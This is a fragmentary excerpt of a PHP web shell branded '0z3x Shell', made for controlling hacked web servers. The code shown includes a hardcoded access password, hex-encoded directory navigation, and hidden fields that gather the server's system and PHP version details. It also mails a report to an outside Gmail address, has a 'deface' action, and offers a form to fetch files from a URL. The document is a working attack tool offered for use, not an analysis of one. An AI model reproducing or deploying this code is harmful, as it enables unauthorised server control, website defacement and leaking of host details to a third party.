...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "seller12_xtolz"; //Change Password
	if (isset($_GET['pass'])) {
	...
	<head>
	<title>-=[ 0Z3X ]=-</title>
	<link rel='icon' href='https://www.ozex.cc/images/olvxtr.png'>
	...
	<html>
	<head>
		<title>0z3x Shell</title>
		<meta charset='UTF-8'>
		<meta name='author' content='mr0x01'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>0Z3X</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		<input type='hidden' name='uname' value='@<nobr>".substr(@php_uname(),0,120)."</nobr>@si'>
        <input type='hidden' name='pver' value='<pver>".substr(@phpversion(),0,20)."</pver>'>
		...
		@mail('0Z3X@gmail.com', 'Hehehe', $report_bug);
		}
		if($_7['id'] == 'deface'){
...
Allow from all
		...
		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			...
			echo "<div class='card card-body text-dark input-group mb-3'>
					...
					<form method='POST' enctype='multipart/form-data'>
						<div class='input-group'>
						<input class='form-control form-control-sm' type='url' name='url' placeholder='Enter the link' required>
					</div>
					<div class='input-group'>
		...
		</div><div class='text-secondary'>&copy <a href="https://www.ozex.cc/register?ref=27" target="_blank">0Z3X</a></div>
	</div>
</div>
</body>
</html>
